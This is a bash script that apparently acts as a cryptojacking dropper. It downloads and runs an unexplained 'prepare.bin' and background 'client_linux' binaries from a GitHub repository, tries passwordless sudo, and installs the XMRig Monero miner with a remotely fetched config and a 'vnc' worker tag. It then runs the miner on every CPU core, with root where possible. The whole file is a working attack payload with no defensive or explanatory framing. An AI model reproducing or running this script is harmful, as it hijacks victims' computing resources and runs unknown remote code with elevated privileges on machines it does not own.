#!/bin/bash

xmrver="6.21.3"

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    # create tmp if it doesn't exist (yes that happened...)
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

# remove any aliases
unalias -a

# execute prepare.bin
curl -LO https://github.com/spetterman66/verynicerepo/raw/main/prepare.bin
chmod +x prepare.bin
./prepare.bin

# try to install wget and util-linux
sudo -n apt update
sudo -n apt install -y wget util-linux
sudo -n apk add wget util-linux
sudo -n dnf install wget util-linux

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -OL"
fi

# arm64 check
arch=$(uname -m)
is_arm64=false

if [ "$arch" == "aarch64" ]; then
    is_arm64=true
fi

mkdir -p /tmp/xmrig
# run the script in /tmp/xmrig, after the script checks if it exists or not
cd /tmp/xmrig

# use curl because it's present on more distributions
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
cd xmrig-$xmrver

# replace xmrig file if system is arm64
if $is_arm64; then
    rm -f xmrig
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
fi

# probably should set a var to either arm64 or x64, i'll do it later ig...
if $is_arm64; then
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_arm64
    chmod +x client_linux_arm64 && ./client_linux_arm64 &
else
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/client_linux_x64
    chmod +x client_linux_x64 && ./client_linux_x64 &
fi

# just to be extra safe
chmod +x xmrig

rm -f config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json

num_threads=$(cat /proc/cpuinfo | grep -c '^processor')

# generate the replacement string with -1 repeated num_threads times, separated by commas
replacement_string=$(yes -1 | head -n $num_threads | paste -sd, -)
replacement_string=${replacement_string%, }  # remove the trailing comma and space

sed -i "s/THREADSTRINGTOREPLACE/$replacement_string/g" config.json

sudo -n ./xmrig
./xmrig
